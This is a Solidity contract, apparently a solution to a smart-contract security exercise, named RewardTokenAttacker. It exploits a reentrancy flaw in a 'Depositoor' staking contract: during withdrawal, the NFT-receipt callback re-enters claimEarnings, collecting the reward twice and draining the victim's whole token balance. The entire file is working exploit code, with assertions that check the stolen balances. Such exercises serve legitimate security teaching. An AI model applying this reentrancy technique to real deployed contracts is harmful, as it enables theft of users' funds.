// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../RewardToken.sol";

contract RewardTokenAttacker is IERC721Receiver {
    RewardToken token;
    ERC721 nft;
    Depositoor victim;

    function deposit(ERC721 _nft, RewardToken _token, Depositoor _victim, uint256 tokenId) external {
        token = _token;
        nft = _nft;
        victim = _victim;

        _nft.safeTransferFrom(address(this), address(_victim), tokenId);
    }

    function attack(uint256 tokenId) external {
        assert(token.balanceOf(address(this)) == 0);
        assert(token.balanceOf(address(victim)) == 100e18);

        (uint256 timestamp, uint256 id) = victim.stakes(address(this));
        assert(timestamp > 0);
        assert(id == 42);

        victim.withdrawAndClaimEarnings(tokenId);

        assert(token.balanceOf(address(this)) == 100e18);
        assert(token.balanceOf(address(victim)) == 0);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        assert(token.balanceOf(address(victim)) == 50e18);
        assert(token.balanceOf(address(this)) == 50e18);
        assert(from == operator);
        assert(address(nft) == msg.sender);

        victim.claimEarnings(tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }
}
